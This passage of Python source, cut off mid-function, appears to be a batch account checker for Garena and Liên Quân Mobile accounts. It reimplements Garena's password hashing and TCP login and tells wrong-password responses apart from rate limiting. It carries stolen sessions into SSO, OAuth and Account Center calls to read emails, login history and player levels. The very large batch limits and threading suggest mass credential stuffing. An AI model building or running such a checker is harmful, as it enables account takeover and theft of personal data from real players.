
import argparse
import base64
import csv
import hashlib
import json
import os
import secrets
import socket
import ssl
import threading
import time
import traceback
import unicodedata
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from http import HTTPStatus
from http.cookiejar import Cookie, CookieJar
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

import garena_tcp_login_chrome as tcp_ui
import db


MAX_BODY = 8 * 1024
TEST_LOCK = threading.Lock()
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36"
)
SSO_LOGIN_URL = (
    "https://sso.garena.com/universal/login?"
    "app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"
)

SECRET_KEYS = {
    "access_token",
    "refresh_token",
    "authtoken",
    "ssokey",
    "sso_key",
    "session_key",
    "sessionkey",
    "oauth_code",
    "authorization_code",
    "code",
    "encodeparam",
    "authorization",
    "cookie",
    "client_secret",
}
PII_PARTS = ("phone", "mobile", "email", "identity", "passport", "cmnd", "cccd", "id_card")
ACCOUNT_VISIBLE_PII = frozenset({"email", "email_v", "email_verified", "email_verify"})
MAX_BATCH_BODY = 10 * 1024 * 1024
MAX_BATCH_ACCOUNTS = 10**18
ACCOUNT_MAX_ATTEMPTS = 3
KIENTUONG_MAX_RETRIES = 6
KIENTUONG_MAX_ATTEMPTS = 1 + KIENTUONG_MAX_RETRIES


def resilient_tcp_client_type(tcp_module: Any) -> type:
    """Accept server-push frames while waiting for the requested command response."""

    base = tcp_module.GarenaTcpClient

    class ResilientGarenaTcpClient(base):
        def __init__(self, *args: Any, **kwargs: Any) -> None:
            super().__init__(*args, **kwargs)
            self.ignored_server_commands: list[int] = []

        def _request(self, command: int, payload: bytes, key: bytes | None = None) -> bytes:
            if self.socket is None:
                raise tcp_module.GarenaError("Kết nối Garena chưa được mở")

            request_id = self._next_id()
            try:
                self.socket.sendall(tcp_module._encode_packet(request_id, command, payload, key))
            except OSError as exc:
                raise tcp_module.GarenaError("Không gửi được yêu cầu tới Garena") from exc

            deadline = time.monotonic() + float(self.timeout)
            previous_timeout = self.socket.gettimeout()
            try:
                for _ in range(16):
                    remaining = deadline - time.monotonic()
                    if remaining <= 0:
                        break
                    self.socket.settimeout(max(0.1, remaining))
                    size = tcp_module.struct.unpack("<I", self._receive_exact(4))[0]
                    if size <= 0 or size > 4 * 1024 * 1024:
                        raise tcp_module.GarenaError("Kích thước phản hồi Garena không hợp lệ")
                    header, reply = tcp_module._decode_packet(self._receive_exact(size), key)
                    reply_command = tcp_module._first_int(header, 4)
                    result = tcp_module._first_int(header, 5)
                    if reply_command != command:
                        self.ignored_server_commands.append(reply_command)
                        continue
                    if result != 0:
                        command_name = {
                            0x100: "LOGIN_PREPARE",
                            0x101: "LOGIN",
                            0x1BA: "SSO_KEY_GET",
                        }.get(command, "UNKNOWN")
                        rejection = tcp_module.GarenaError(
                            f"Garena từ chối ở bước {command_name} "
                            f"(lệnh 0x{command:X}), mã {result}"
                        )
                        rejection.garena_rejected = True
                        rejection.garena_command = command
                        rejection.garena_result = result
                        raise rejection
                    return reply
            finally:
                self.socket.settimeout(previous_timeout)

            ignored = ", ".join(f"0x{item:X}" for item in self.ignored_server_commands[-8:])
            raise tcp_module.GarenaError(
                f"Không nhận được phản hồi 0x{command:X}; server-push đã bỏ qua: {ignored or 'không có'}"
            )

    ResilientGarenaTcpClient.__name__ = "ResilientGarenaTcpClient"
    return ResilientGarenaTcpClient


def tcp_login_was_rejected(error: Any) -> bool:
    """Only an explicit Garena TCP rejection at LOGIN step proves credentials are wrong.
    
    Rejection at LOGIN_PREPARE (0x100) is rate limiting, not wrong password.
    Only rejection at LOGIN (0x101) with specific error codes means wrong credentials.
    """

    if bool(getattr(error, "garena_rejected", False)):
        command = getattr(error, "garena_command", 0)
        result_code = getattr(error, "garena_result", 0)
        # Chỉ bước LOGIN (0x101) mới là sai pass thật
        # LOGIN_PREPARE (0x100) reject = rate limit
        # SSO_KEY_GET (0x1BA) reject = session issue
        if command == 0x101:
            return True
        # Bước khác reject = rate limit / server issue, không phải sai pass
        return False
    message = str(error or "").strip().casefold()
    ascii_message = "".join(
        char
        for char in unicodedata.normalize("NFKD", message)
        if not unicodedata.combining(char)
    )
    explicitly_rejected = "tu choi" in ascii_message or "rejected" in ascii_message
    # Chỉ coi là sai pass khi message rõ ràng là bước LOGIN bị reject
    if "garena" in ascii_message and explicitly_rejected:
        # Kiểm tra có phải bước LOGIN_PREPARE không
        if "prepare" in ascii_message or "0x100" in ascii_message:
            return False  # Rate limit, không phải sai pass
        return True
    return False


def api_failure_text(result: Any, fallback: str) -> str:
    """Extract a useful, non-secret error from an API result."""

    if not isinstance(result, dict):
        return fallback
    direct = str(result.get("error") or "").strip()
    if direct:
        return direct
    body = result.get("body")
    if isinstance(body, dict):
        for key in ("error", "message", "error_message"):
            value = str(body.get(key) or "").strip()
            if value:
                return value
    return fallback


def kientuong_player_has_level(result: Any) -> bool:
    """Only complete player data may stop the bounded Kien Tuong retries."""

    if not isinstance(result, dict) or not result.get("ok"):
        return False
    body = result.get("body")
    if not isinstance(body, dict):
        return False
    payload = body.get("data") if isinstance(body.get("data"), dict) else body
    player = payload.get("player") if isinstance(payload, dict) else None
    if not isinstance(player, dict) or not player:
        return False
    level = player.get("level")
    return level is not None and str(level).strip() != ""


def kientuong_no_character_response(result: Any) -> bool:
    """The observed no-character response is HTTP 422 with an empty JSON body."""

    return bool(
        isinstance(result, dict)
        and result.get("status") == 422
        and result.get("body") == {}
    )


def fingerprint(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()[:12]


def redact_value(key: str, value: Any, visible_pii: frozenset[str] = frozenset()) -> Any:
    folded = key.casefold().replace("-", "_")
    compact = folded.replace("_", "")
    if folded in SECRET_KEYS or compact in SECRET_KEYS:
        text = str(value or "")
        return f"<redacted sha256:{fingerprint(text)}>" if text else "<redacted>"
    if (
        folded not in visible_pii
        and any(part in folded for part in PII_PARTS)
        and isinstance(value, str)
        and value
    ):
        if len(value) <= 4:
            return "****"
        return value[:2] + "***" + value[-2:]
    return value


def redact_tree(
    value: Any,
    key: str = "",
    visible_pii: frozenset[str] = frozenset(),
) -> Any:
    value = redact_value(key, value, visible_pii)
    if isinstance(value, dict):
        return {
            str(k): redact_tree(v, str(k), visible_pii)
            for k, v in value.items()
        }
    if isinstance(value, list):
        return [redact_tree(item, key, visible_pii) for item in value]
    return value


def safe_url(url: str) -> str:
    parsed = urllib.parse.urlsplit(url)
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))


def query_values(url: str) -> dict[str, str]:
    parsed = urllib.parse.urlsplit(url)
    values: dict[str, str] = {}
    for encoded in (parsed.query, parsed.fragment):
        for key, items in urllib.parse.parse_qs(encoded, keep_blank_values=True).items():
            if items:
                values[key] = items[-1]
    return values


def callback_matches(url: str, expected: str) -> bool:
    actual_parts = urllib.parse.urlsplit(url)
    expected_parts = urllib.parse.urlsplit(expected)
    return (
        actual_parts.scheme == "https"
        and actual_parts.scheme == expected_parts.scheme
        and actual_parts.netloc.casefold() == expected_parts.netloc.casefold()
        and actual_parts.path == expected_parts.path
    )


def normalized_label(value: Any) -> str:
    text = unicodedata.normalize("NFD", str(value or ""))
    return " ".join(
        "".join(char for char in text if unicodedata.category(char) != "Mn")
        .casefold()
        .split()
    )


def latest_lien_quan_login(logs: Any) -> dict[str, Any] | None:
    """Return the newest Account Center login whose source is Liên Quân Mobile."""

    if not isinstance(logs, list):
        return None
    matches = [
        item
        for item in logs
        if isinstance(item, dict)
        and "lien quan mobile" in normalized_label(item.get("source"))
    ]
    if not matches:
        return None

    def timestamp(item: dict[str, Any]) -> float:
        try:
            return float(item.get("timestamp") or 0)
        except (TypeError, ValueError):
            return 0.0

    return max(matches, key=timestamp)


def format_login_timestamp(value: Any) -> str:
    try:
        timestamp = float(value)
    except (TypeError, ValueError):
        return "không rõ"
    if timestamp <= 0:
        return "không rõ"
    vietnam_time = datetime.fromtimestamp(
        timestamp, tz=timezone(timedelta(hours=7))
    )
    return vietnam_time.strftime("%Y-%m-%d %H:%M:%S GMT+7")


def garena_web_password(password: str, v1: str, v2: str) -> str:
    """Match the password transform used by Garena's current Universal Login page."""

    md5_digest = hashlib.md5(password.encode("utf-8"), usedforsecurity=False).digest()
    md5_hex = md5_digest.hex()
    inner_hex = hashlib.sha256((md5_hex + v1).encode("utf-8")).hexdigest()
    aes_key = hashlib.sha256((inner_hex + v2).encode("utf-8")).digest()
    encryptor = Cipher(algorithms.AES(aes_key), modes.ECB()).encryptor()
    return (encryptor.update(md5_digest) + encryptor.finalize()).hex()


class WebSession:
    def __init__(self, timeout: float) -> None:
        self.cookies = CookieJar()
        self.timeout = timeout
        tls_context = ssl.create_default_context()
        # Python 3.14 enables OpenSSL X509_STRICT. Some certificates in the
        # Windows trust chain on this machine predate that RFC requirement.
        # Clearing only STRICT keeps CA, hostname, expiry and signature checks.
        if hasattr(ssl, "VERIFY_X509_STRICT"):
            tls_context.verify_flags &= ~ssl.VERIFY_X509_STRICT
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies),
            urllib.request.HTTPSHandler(context=tls_context),
        )

    def request(
        self,
        url: str,
        *,
        method: str = "GET",
        json_body: Any | None = None,
        form_body: dict[str, Any] | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, str, str, Any]:
        data = None
        request_headers = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.7",
        }
        if headers:
            request_headers.update(headers)
        if json_body is not None:
            data = json.dumps(json_body, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
            request_headers["Content-Type"] = "application/json"
        elif form_body is not None:
            data = urllib.parse.urlencode(form_body).encode("utf-8")
            request_headers["Content-Type"] = "application/x-www-form-urlencoded"

        request = urllib.request.Request(url, data=data, headers=request_headers, method=method)
        try:
            response = self.opener.open(request, timeout=self.timeout)
        except urllib.error.HTTPError as exc:
            response = exc

        raw = response.read(2 * 1024 * 1024)
        status = int(response.status)
        final_url = response.geturl()
        content_type = response.headers.get("Content-Type", "")
        text = raw.decode("utf-8", "replace")
        try:
            body: Any = json.loads(text)
        except json.JSONDecodeError:
            body = {"text_preview": text[:2000]}
        return status, final_url, content_type, body

    def api_result(
        self,
        url: str,
        *,
        method: str = "GET",
        json_body: Any | None = None,
        form_body: dict[str, Any] | None = None,
        headers: dict[str, str] | None = None,
        visible_pii: frozenset[str] = frozenset(),
    ) -> dict[str, Any]:
        started = time.monotonic()
        try:
            status, final_url, content_type, body = self.request(
                url, method=method, json_body=json_body, form_body=form_body, headers=headers
            )
            http_ok = 200 <= status < 300
            application_ok = not (
                isinstance(body, dict)
                and (body.get("error") not in (None, "", 0, False) or bool(body.get("errors")))
            )
            return {
                "ok": http_ok and application_ok,
                "http_ok": http_ok,
                "status": status,
                "url": safe_url(final_url),
                "content_type": content_type,
                "elapsed_ms": round((time.monotonic() - started) * 1000),
                "body": redact_tree(body, visible_pii=visible_pii),
            }
        except Exception as exc:
            return {
                "ok": False,
                "status": 0,
                "url": safe_url(url),
                "elapsed_ms": round((time.monotonic() - started) * 1000),
                "error": (str(exc).strip() or type(exc).__name__)[:500],
            }

    @staticmethod
    def _api_url(host: str, path: str, params: dict[str, Any]) -> str:
        values = {k: v for k, v in params.items() if v is not None}
        values["format"] = "json"
        values["id"] = str(int(time.time() * 1000))
        return f"https://{host}{path}?" + urllib.parse.urlencode(values)

    def _credential_login(
        self,
        host: str,
        app_id: str,
        account: str,
        password: str,
        redirect_uri: str,
        *,
        login_secondary: str | None = None,
    ) -> dict[str, Any]:
        started = time.monotonic()
        common = {"app_id": app_id, "account": account}
        prelogin: Any = None
        status = 0
        for attempt in range(3):
            try:
                status, _, _, prelogin = self.request(
                    self._api_url(host, "/api/prelogin", common),
                    headers={"Referer": f"https://{host}/universal/"},
                )
            except Exception:
                status, prelogin = 0, None
            if status == 200 and isinstance(prelogin, dict) and not prelogin.get("error"):
                break
            # Retry immediately; the HTTP request timeout already bounds each attempt.
        if status != 200 or not isinstance(prelogin, dict) or prelogin.get("error"):
            return {
                "ok": False,
                "stage": "prelogin",
                "status": status,
                "error": str(prelogin.get("error", "invalid_prelogin_response"))
                if isinstance(prelogin, dict)
                else "invalid_prelogin_response",
                "elapsed_ms": round((time.monotonic() - started) * 1000),
            }
        if not isinstance(prelogin.get("v1"), str) or not isinstance(prelogin.get("v2"), str):
            return {
                "ok": False,
                "stage": "prelogin",
                "status": status,
                "error": "missing_password_challenge",
                "elapsed_ms": round((time.monotonic() - started) * 1000),
            }

        transformed = garena_web_password(password, prelogin["v1"], prelogin["v2"])
        login_params: dict[str, Any] = {
            "app_id": app_id,
            "account": account,
            "password": transformed,
            "redirect_uri": redirect_uri,
        }
        if login_secondary is not None:
            login_params["login_secondary"] = login_secondary
        status, _, _, login = self.request(
            self._api_url(host, "/api/login", login_params),
            headers={"Referer": f"https://{host}/universal/"},
        )
        transformed = ""
        if status != 200 or not isinstance(login, dict) or login.get("error"):
            return {
                "ok": False,
                "stage": "login",
                "status": status,
                "error": str(login.get("error", "invalid_login_response"))
                if isinstance(login, dict)
                else "invalid_login_response",
                "challenge_required": bool(
                    isinstance(login, dict)
                    and any(word in str(login.get("error", "")) for word in ("captcha", "security", "otp"))
                ),
                "elapsed_ms": round((time.monotonic() - started) * 1000),
            }
        return {
            "ok": True,
            "stage": "login",
            "status": status,
            "redirect_uri": str(login.get("redirect_uri", "")),
            "session_key": str(login.get("session_key", "")),
            "elapsed_ms": round((time.monotonic() - started) * 1000),
        }

    def oauth_callback(
        self,
        account: str,
        password: str,
        params: dict[str, Any],
        *,
        ensure_login: bool,
    ) -> tuple[dict[str, Any], bool]:
        started = time.monotonic()
        init_url = self._api_url("auth.garena.com", "/api/universal/oauth", params)
        init: Any = None
        status = 0
        for attempt in range(3):
            try:
                status, _, _, init = self.request(init_url)
            except Exception:
                status, init = 0, None
            if status == 200 and isinstance(init, dict) and not init.get("error"):
                break
            # Retry immediately; the HTTP request timeout already bounds each attempt.
        if status != 200 or not isinstance(init, dict) or init.get("error"):
            return ({
                "ok": False,
                "stage": "oauth_init",
                "status": status,
                "error": str(init.get("error", "invalid_oauth_init")) if isinstance(init, dict) else "invalid_oauth_init",
            }, ensure_login)

        logged_in = bool((init.get("sso_session") or {}).get("login"))
        login_result: dict[str, Any] | None = None
        if not logged_in and not ensure_login:
            login_result = self._credential_login(
                "auth.garena.com",
                str(params["client_id"]),
                account,
                password,
                str(params["redirect_uri"]),
            )
            if not login_result.get("ok"):
                return (login_result, False)
            ensure_login = True
        elif logged_in:
            ensure_login = True

        grant = {k: v for k, v in params.items() if k not in {"platform", "locale", "all_platforms", "prompt"}}
        grant["format"] = "json"
        grant["id"] = str(int(time.time() * 1000))
        status, _, _, body = self.request(
            "https://auth.garena.com/oauth/token/grant",
            method="POST",
            form_body=grant,
            headers={"Referer": "https://auth.garena.com/universal/"},
        )
        if status != 200 or not isinstance(body, dict) or body.get("error") or not body.get("redirect_uri"):
            return ({
                "ok": False,
                "stage": "oauth_grant",
                "status": status,
                "error": str(body.get("error", "missing_callback")) if isinstance(body, dict) else "invalid_grant_response",
                "elapsed_ms": round((time.monotonic() - started) * 1000),
            }, ensure_login)

        callback_url = str(body["redirect_uri"])
        if not callback_matches(callback_url, str(params["redirect_uri"])):
            return ({
                "ok": False,
                "stage": "callback_validation",
                "status": status,
                "error": "unexpected_callback_origin",
                "callback_url": safe_url(callback_url),
            }, ensure_login)
        callback_status, final_url, content_type, _ = self.request(callback_url)
        callback_values = query_values(callback_url)
        return ({
            "ok": 200 <= callback_status < 400,
            "stage": "callback",
            "status": callback_status,
            "final_url": safe_url(final_url),
            "content_type": content_type,
            "callback_values": redact_tree(callback_values),
            "_callback_values": callback_values,
            "elapsed_ms": round((time.monotonic() - started) * 1000),
        }, ensure_login)

    def bootstrap(self, url: str) -> dict[str, Any]:
        started = time.monotonic()
        try:
            status, final_url, content_type, body = self.request(url)
            return {
                "ok": 200 <= status < 400,
                "status": status,
                "final_url": safe_url(final_url),
                "content_type": content_type,
                "elapsed_ms": round((time.monotonic() - started) * 1000),
                "query": query_values(final_url),
                "body_kind": "json" if not (isinstance(body, dict) and "text_preview" in body) else "html/text",
            }
        except Exception as exc:
            return {
                "ok": False,
                "status": 0,
                "final_url": safe_url(url),
                "elapsed_ms": round((time.monotonic() - started) * 1000),
                "query": {},
                "error": (str(exc).strip() or type(exc).__name__)[:500],
            }


def fetch_latest_lien_quan_login(
    session: WebSession, account_init: dict[str, Any]
) -> dict[str, Any]:
    """Read the complete available history and return the newest Liên Quân entry."""

    current_result = account_init
    seen_cursors: set[tuple[str, str]] = set()
    pages_checked = 0
    logs_checked = 0
    exhausted = False
    pagination_stalled = False
    newest_match: dict[str, Any] | None = None

    while True:
        body = current_result.get("body") or {}
        if not current_result.get("ok") or not isinstance(body, dict):
            break
        pages_checked += 1
        page_logs = body.get("login_history")
        if isinstance(page_logs, list):
            logs_checked += len(page_logs)
        match = latest_lien_quan_login(page_logs)
        if match:
            newest_match = latest_lien_quan_login(
                [item for item in (newest_match, match) if item is not None]
            )

        last_login_ts = body.get("last_login_ts")
        last_im_ts = body.get("last_im_ts")
        params = {
            key: value
            for key, value in (
                ("last_login_ts", last_login_ts),
                ("last_im_ts", last_im_ts),
            )
            if value not in (None, "", 0, "0")
        }
        cursor = (str(last_login_ts or ""), str(last_im_ts or ""))
        if not params:
            exhausted = True
            break
        if cursor in seen_cursors:
            pagination_stalled = True
            break
        seen_cursors.add(cursor)
        current_result = session.api_result(
            "https://account.garena.com/api/account/login_logs/get",
            method="POST",
            json_body=params,
            headers={"Referer": "https://account.garena.com/login-history"},
        )

    return {
        "found": newest_match is not None,
        "entry": newest_match,
        "pages_checked": pages_checked,
        "logs_checked": logs_checked,
        "history_exhausted": exhausted,
        "pagination_stalled": pagination_stalled,
    }


def public_sso_diagnostics(timeout: float) -> dict[str, Any]:
    """Check the public SSO route without sending account or session credentials."""

    host = "sso.garena.com"
    started = time.monotonic()
    result: dict[str, Any] = {
        "ok": False,
        "target": safe_url(SSO_LOGIN_URL),
        "credentials_sent": False,
    }
    try:
        result["dns_addresses"] = sorted(
            {
                item[4][0]
                for item in socket.getaddrinfo(host, 443, type=socket.SOCK_STREAM)
            }
        )

        tls_context = ssl.create_default_context()
        if hasattr(ssl, "VERIFY_X509_STRICT"):
            tls_context.verify_flags &= ~ssl.VERIFY_X509_STRICT

        tcp_started = time.monotonic()
        with socket.create_connection((host, 443), timeout=timeout) as tcp_socket:
            result["tcp_connect_ms"] = round((time.monotonic() - tcp_started) * 1000)
            remote_host, remote_port = tcp_socket.getpeername()[:2]
            result["remote_endpoint"] = f"{remote_host}:{remote_port}"

            tls_started = time.monotonic()
            with tls_context.wrap_socket(tcp_socket, server_hostname=host) as tls_socket:
                result["tls_handshake_ms"] = round((time.monotonic() - tls_started) * 1000)
                result["tls_version"] = tls_socket.version()
                cipher = tls_socket.cipher()
                result["cipher"] = cipher[0] if cipher else None
                certificate = tls_socket.getpeercert()
                result["certificate_subject"] = certificate.get("subject", ())
                result["certificate_issuer"] = certificate.get("issuer", ())
                result["certificate_expires"] = certificate.get("notAfter")

        result["http"] = WebSession(timeout).bootstrap(SSO_LOGIN_URL)
        result["ok"] = bool(result["http"].get("ok"))
    except Exception as exc:
        result["error"] = (str(exc).strip() or type(exc).__name__)[:500]
    result["elapsed_ms"] = round((time.monotonic() - started) * 1000)
    return result


def web_account_center_login(
    session: WebSession,
    account: str,
    password: str,
) -> dict[str, Any]:
    """Log in through the Account Center's current app_id=10100 SSO route."""

    started = time.monotonic()
    result: dict[str, Any] = {
        "ok": False,
        "stage": "bootstrap",
        "login_url": safe_url(SSO_LOGIN_URL),
    }
    bootstrap = session.bootstrap(SSO_LOGIN_URL)
    if not bootstrap.get("ok"):
        result.update(
            {
                "status": bootstrap.get("status", 0),
                "error": bootstrap.get("error") or "account_sso_bootstrap_failed",
                "elapsed_ms": round((time.monotonic() - started) * 1000),
            }
        )
        return result

    login = session._credential_login(
        "sso.garena.com",
        "10100",
        account,
        password,
        "https://account.garena.com/",
    )
    result.update(
        {
            "stage": login.get("stage") or "login",
            "status": login.get("status", 0),
            "session_key": str(login.get("session_key", "") or ""),
        }
    )
    if not login.get("ok"):
        result.update(
            {
                "error": login.get("error") or "account_sso_login_failed",
                "challenge_required": bool(login.get("challenge_required")),
                "elapsed_ms": round((time.monotonic() - started) * 1000),
            }
        )
        return result

    redirect_uri = str(login.get("redirect_uri") or "")
    if not redirect_uri:
        result.update(
            {
                "stage": "callback",
                "error": "missing_account_callback",
                "elapsed_ms": round((time.monotonic() - started) * 1000),
            }
        )
        return result
    if not callback_matches(redirect_uri, "https://account.garena.com/"):
        result.update(
            {
                "stage": "callback_validation",
                "error": "unexpected_account_callback",
                "elapsed_ms": round((time.monotonic() - started) * 1000),
            }
        )
        return result

    callback_status, final_url, _, _ = session.request(redirect_uri)
    result.update(
        {
            "stage": "account_init",
            "callback_status": callback_status,
            "final_url": safe_url(final_url),
        }
    )
    account_init = session.api_result(
        "https://account.garena.com/api/account/init",
        visible_pii=ACCOUNT_VISIBLE_PII,
    )
    result["account_init"] = account_init
    result["ok"] = bool(200 <= callback_status < 400 and account_init.get("ok"))
    if account_init.get("ok"):
        result["latest_lien_quan_login"] = fetch_latest_lien_quan_login(
            session, account_init
        )
    if not result["ok"]:
        result["error"] = account_init.get("error") or "account_init_failed"
    result["elapsed_ms"] = round((time.monotonic() - started) * 1000)
    return result


def legacy_account_sso_probe(sso_key: str, sso_expiry: int, timeout: float) -> dict[str, Any]:
    """Test the only plausible TCP-to-web bridge without putting secrets in a URL."""

    started = time.monotonic()
    session = WebSession(timeout)
    session.cookies.set_cookie(
        Cookie(
            version=0,
            name="sso_key",
            value=sso_key,
            port=None,
            port_specified=False,
            domain="sso.garena.com",
            domain_specified=True,
            domain_initial_dot=False,
            path="/",
            path_specified=True,
            secure=True,
            expires=sso_expiry,
            discard=False,
            comment=None,
            comment_url=None,
            rest={"HttpOnly": None},
            rfc2109=False,
        )
    )
    params = {
        "app_id": "10100",
        "redirect_uri": "https://account.garena.com/",
        "locale": "vi-VN",
    }
    try:
        status, _, content_type, body = session.request(
            session._api_url("sso.garena.com", "/api/universal/login", params),
            headers={"Referer": "https://sso.garena.com/universal/login"},
        )
        if not isinstance(body, dict):
            return {
                "ok": False,
                "accepted": False,
                "status": status,
                "error": "invalid_sso_response",
                "elapsed_ms": round((time.monotonic() - started) * 1000),
            }
        logged_in = bool((body.get("sso_session") or {}).get("login"))
        redirect_uri = str(body.get("redirect_uri") or "")
        accepted = logged_in or bool(redirect_uri)
        result: dict[str, Any] = {
            "ok": 200 <= status < 300 and accepted,
            "accepted": accepted,
            "status": status,
            "content_type": content_type,
            "sso_session_login": logged_in,
            "redirect_received": bool(redirect_uri),
            "error": str(body.get("error") or "") or None,
            "credential_used": "tcp_sso_key_cookie",
            "tcp_session_key_sent": False,
            "elapsed_ms": round((time.monotonic() - started) * 1000),
        }
        if redirect_uri:
            if not callback_matches(redirect_uri, "https://account.garena.com/"):
                result.update({"ok": False, "accepted": False, "error": "unexpected_redirect_origin"})
            else:
                redirect_status, final_url, _, _ = session.request(redirect_uri)
                result["redirect_status"] = redirect_status
                result["final_url"] = safe_url(final_url)
        if result["accepted"]:
            result["account_init"] = session.api_result(
                "https://account.garena.com/api/account/init",
                visible_pii=ACCOUNT_VISIBLE_PII,
            )
            result["latest_lien_quan_login"] = fetch_latest_lien_quan_login(
                session, result["account_init"]
            )
            oauth_params = {
                "client_id": "100054",
                "redirect_uri": "https://kientuong.lienquan.garena.vn/auth/login/callback",
                "response_type": "code",
                "platform": "1",
                "locale": "vi-VN",
            }
            oauth_started = time.monotonic()
            oauth_status, _, oauth_type, oauth_body = session.request(
                session._api_url("auth.garena.com", "/api/universal/oauth", oauth_params),
                headers={"Referer": "https://auth.garena.com/universal/oauth"},
            )
            oauth_result: dict[str, Any] = {
                "ok": False,
                "status": oauth_status,
                "content_type": oauth_type,
                "account_session_reused": True,
                "credential_login_called": False,
                "sso_session_login": False,
                "callback_received": False,
            }
            if isinstance(oauth_body, dict):
                oauth_result["sso_session_login"] = bool(
                    (oauth_body.get("sso_session") or {}).get("login")
                )
                oauth_result["error"] = str(oauth_body.get("error") or "") or None
                callback_url = str(oauth_body.get("redirect_uri") or "")

                if oauth_result["sso_session_login"] and not callback_url:
                    grant = {
                        "client_id": "100054",
                        "response_type": "code",
                        "redirect_uri": oauth_params["redirect_uri"],
                        "format": "json",
                        "id": str(int(time.time() * 1000)),
                    }
                    grant_status, _, _, grant_body = session.request(
                        "https://auth.garena.com/oauth/token/grant",
                        method="POST",
                        form_body=grant,
                        headers={"Referer": "https://auth.garena.com/universal/oauth"},
                    )
                    oauth_result["grant_status"] = grant_status
                    if isinstance(grant_body, dict):
                        oauth_result["grant_error"] = str(grant_body.get("error") or "") or None
                        callback_url = str(grant_body.get("redirect_uri") or "")

                if callback_url:
                    oauth_result["callback_received"] = True
                    if callback_matches(callback_url, oauth_params["redirect_uri"]):
                        callback_status, final_url, _, _ = session.request(callback_url)
                        oauth_result["callback_status"] = callback_status
                        oauth_result["final_url"] = safe_url(final_url)
                        player_api: dict[str, Any] = {}
                        no_character_responses = 0
                        for player_attempt in range(1, KIENTUONG_MAX_ATTEMPTS + 1):
                            player_api = session.api_result(
                                "https://kientuong.lienquan.garena.vn/api/player/get",
                                headers={"Referer": "https://kientuong.lienquan.garena.vn/"},
                            )
                            oauth_result["player_attempts"] = player_attempt
                            if kientuong_no_character_response(player_api):
                                no_character_responses += 1
                            if kientuong_player_has_level(player_api):
                                break
                            if no_character_responses >= 2:
                                break
                            if player_attempt < KIENTUONG_MAX_ATTEMPTS:
                                time.sleep(0.75)
                        oauth_result["player_api"] = player_api
                        oauth_result["no_character_responses"] = no_character_responses
                        oauth_result["ok"] = bool(oauth_result["player_api"].get("ok"))
                    else:
                        oauth_result["error"] = "unexpected_callback_origin"
            else:
                oauth_result["error"] = "invalid_oauth_response"
            oauth_result["elapsed_ms"] = round((time.monotonic() - oauth_started) * 1000)
            result["account_to_kientuong_oauth"] = oauth_result
        return result
    except Exception as exc:
        return {
            "ok": False,
            "accepted": False,
            "status": 0,
            "error": (str(exc).strip() or type(exc).__name__)[:500],
            "credential_used": "tcp_sso_key_cookie",
            "tcp_session_key_sent": False,
            "elapsed_ms": round((time.monotonic() - started) * 1000),
        }
def run_api_tests(tcp_module: Any, account: str, password: str, timeout: float) -> dict[str, Any]:
    started = time.monotonic()
    results: dict[str, Any] = {
        "tcp": {"ok": False, "account": account},
        "apis": {},
        "web_auth": {},
    }

    sso: Any = None
    try:
        client_type = resilient_tcp_client_type(tcp_module)
        with client_type(timeout=timeout) as client:
            uid = int(client.login(account, password))
            # UID is the authoritative credential result.  Do not lose it merely
            # because the optional SSO_KEY_GET command fails afterwards.
            results["tcp"] = {
                "ok": True,
                "credential_rejected": False,
                "account": account,
                "uid": uid,
                "session_key_bytes": len(client.session_key or b""),
                "ignored_server_commands": [],
            }
            try:
                sso = client.get_sso_key()
            except Exception as exc:
                results["tcp"]["sso_error"] = (
                    str(exc).strip() or type(exc).__name__
                )[:500]
            else:
                results["tcp"].update(
                    {
                        "sso_key": f"<redacted sha256:{fingerprint(str(sso.sso_key))}>",
                        "sso_expiry_time": int(sso.expiry_time),
                        "web_sso_key": str(sso.sso_key),
                    }
                )
            results["tcp"]["ignored_server_commands"] = [
                f"0x{item:X}" for item in client.ignored_server_commands
            ]
    except Exception as exc:
        message = (str(exc).strip() or type(exc).__name__)[:500]
        results["tcp"].update(
            {
                "error": message,
                "credential_rejected": tcp_login_was_rejected(exc),
            }
        )

    tcp_ok = bool(results["tcp"].get("ok"))
    results["credential_valid"] = True if tcp_ok else (
        False if results["tcp"].get("credential_rejected") else None
    )
    if results["tcp"].get("credential_rejected"):
        results["elapsed_ms"] = round((time.monotonic() - started) * 1000)
        password = ""
        return results

    account_init: dict[str, Any] = {}
    player_api: dict[str, Any] = {}
    oauth_chain: dict[str, Any] = {}
    if tcp_ok and sso is not None:
        try:
            probe = legacy_account_sso_probe(str(sso.sso_key), int(sso.expiry_time), timeout)
        except Exception as exc:
            probe = {
                "ok": False,
                "accepted": False,
                "error": (str(exc).strip() or type(exc).__name__)[:500],
            }
        results["tcp_to_web_probe"] = probe
        candidate = probe.get("account_init")
        account_init = candidate if isinstance(candidate, dict) else {}
        results["apis"]["account_init"] = account_init or {
            "ok": False,
            "status": probe.get("status", 0),
            "error": str(probe.get("error") or "sso_key_probe_rejected"),
        }
        oauth_chain = probe.get("account_to_kientuong_oauth")
        oauth_chain = oauth_chain if isinstance(oauth_chain, dict) else {}
        candidate = oauth_chain.get("player_api")
        player_api = candidate if isinstance(candidate, dict) else {}
        results["apis"]["kientuong_player"] = player_api or {
            "ok": False,
            "error": str(oauth_chain.get("error") or "kientuong_probe_failed"),
        }
        results["web_auth"]["account_center"] = {
            "ok": bool(account_init.get("ok")),
            "stage": "tcp_sso_probe",
            "error": None if account_init.get("ok") else str(probe.get("error") or "sso_key_probe_rejected"),
            "session_key": "",
            "latest_lien_quan_login": probe.get("latest_lien_quan_login") or {},
        }
        results["web_auth"]["kientuong"] = {
            "ok": bool(player_api.get("ok")),
